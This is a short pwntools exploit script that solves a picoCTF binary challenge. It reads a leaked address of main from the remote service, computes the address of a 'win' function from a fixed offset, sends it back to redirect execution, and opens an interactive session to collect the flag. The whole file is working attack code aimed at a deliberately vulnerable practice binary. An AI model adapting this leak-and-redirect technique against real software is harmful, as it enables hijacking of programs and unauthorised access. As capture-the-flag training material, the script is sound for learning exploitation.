#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln", checksec=False)
context.binary = exe

if args.LOCAL:
    p = process([exe.path])
    if args.DEBUG:
        gdb.attach(p)
else:
    p = remote("rescued-float.picoctf.net", 55742)

input()

# Leak main address
p.recvuntil(b'main: ')
main_addr = p.recvuntil(b'\n', drop=True)
main_addr = int(main_addr, 16)
print("Main address: " + hex(main_addr))

# Calculate win address and get flag
win = main_addr - 0x96
p.sendlineafter(b'0x12345: ', hex(win).encode())

p.interactive()